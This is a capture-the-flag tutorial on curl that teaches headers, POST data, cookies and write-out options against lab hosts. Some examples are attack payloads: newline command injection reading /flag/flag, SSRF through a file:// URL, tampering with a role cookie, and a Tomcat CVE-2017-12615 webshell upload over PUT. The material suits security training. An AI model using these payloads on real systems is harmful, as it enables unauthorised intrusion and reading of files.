# curl

curl is one of the most essential command-line tools for web CTFs. It allows you to make raw HTTP requests, inspect headers, send POST data, manage cookies, and test endpoints directly from the terminal without needing a browser.


## 1. Inspecting Responses and Headers

By default, curl only prints the response body. When analyzing a service or looking for redirects, headers, or cookies, you can use the `-i` flag to include HTTP response headers.

```bash
curl -i http://10.110.3.72:8063/manager
```

Example output (from Port 8063):
```http
HTTP/1.1 302 FOUND
Server: gunicorn
Date: Sun, 08 Nov 2026 14:00:00 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 209
Location: /login
```

Flags:
- `-i`: Includes HTTP response headers in the output.
- `-s`: Silent mode (hides the progress meter and error messages).
- `-I`: Performs a `HEAD` request (only gets the headers, not the body).


## 2. Sending POST Requests and Form Data

To send data to an endpoint, use `-X POST` along with `-d` (for raw data) or `--data-urlencode` (when your payload contains special characters like spaces, quotes, or newlines).

### Standard POST Data (`-d`)
```bash
curl -i -X POST http://10.110.3.72:8063/login \
  -d "user=employee&password=password"
```

### URL-Encoding Payloads (`--data-urlencode`)
When injecting commands or special characters, raw `-d` might break the request format. `--data-urlencode` automatically encodes characters properly.

From Port 8041 (ShelfTag newline command injection):
```bash
curl -s -X POST http://10.110.3.72:8041/label \
  --data-urlencode 'sku=A1-042' \
  --data-urlencode $'text=x\ncat /flag/flag'
```

From Port 8048 (SSRF with `file://` scheme):
```bash
curl -s -X POST 'http://10.110.3.72:8048/preview' \
  --data-urlencode 'url=file:///flag/flag'
```


## 3. Cookie Management (Saving, Modifying, and Sending)

When attacking session handling or role-based access control, you frequently need to save session cookies, alter their values (e.g. change `role=employee` to `role=manager`), and send them back.

### Saving cookies (`-c`)
The `-c` flag writes cookies received from the server into a file:
```bash
curl -i -c cookies.txt -X POST http://10.110.3.72:8063/login \
  -d "user=employee&password=password"
```

The resulting `cookies.txt` contains:
```
# Netscape HTTP Cookie File
10.110.3.72	FALSE	/	FALSE	0	role	employee
10.110.3.72	FALSE	/	FALSE	0	session	eyJ1c2VyIjoiZW1wbG95ZWUifQ...
```

### Modifying and Sending cookies back (`-b` / `--cookie`)
After editing `cookies.txt` (for example, with `nano` to change `employee` to `manager`), use `-b` to load the cookie jar:
```bash
curl -i -b cookies.txt http://10.110.3.72:8063/manager
```

Alternatively, you can supply cookies inline directly using `--cookie`:
```bash
curl -s --cookie "sid=something" http://auth6.chal.deti:8065/dashboard
```


## 4. Custom Headers (`-H`)

You can set custom HTTP headers using the `-H` flag. This is useful for testing virtual hosts, subdomains, content negotiation, or token authentication.

From Port 8065 (targeting the marketing subdomain on the backend host):
```bash
curl -s -H "Host: marketing.auth6.chal.deti" -X POST \
  http://auth6.chal.deti:8065/plant \
  --data-urlencode "sid=something"
```

Or setting specific content types (e.g., JSON or JSON-Patch):
```bash
curl -X POST http://127.0.0.1:8080/api \
  -H "Content-Type: application/json" \
  -d '{"username":"admin"}'
```


## 5. Formatting Output and Status Codes (`-w`)

When scripting brute-force loops or oracle attacks, parsing full HTML is slow and messy. You can extract status codes, download sizes, and response times using the `-w` (write-out) option.

From Port 8014 (endpoint enumeration script):
```bash
curl -s -w "\n%{http_code}" "http://10.110.3.72:8014/api/users/1"
```

From Port 8016 (oracle timing and length leak):
```bash
curl -s -w "%{http_code}\t%{size_download}" -G "http://10.110.3.72:8016/oracle" \
  --data-urlencode "guess=flag{a"
```
This prints only the HTTP status and response size (e.g. `200 452`), making it easy to check within bash scripts for subtle response differences.


## 6. HTTP Methods (`-X`)

While GET and POST are the most common, some vulnerabilities require less common HTTP verbs (such as `PUT`, `DELETE`, or `PATCH`).

From CVE-2017-12615 (Tomcat webshell upload):
```bash
curl -X PUT "http://127.0.0.1:8080/shell.jsp/" -d '<% /* webshell */ %>'
```
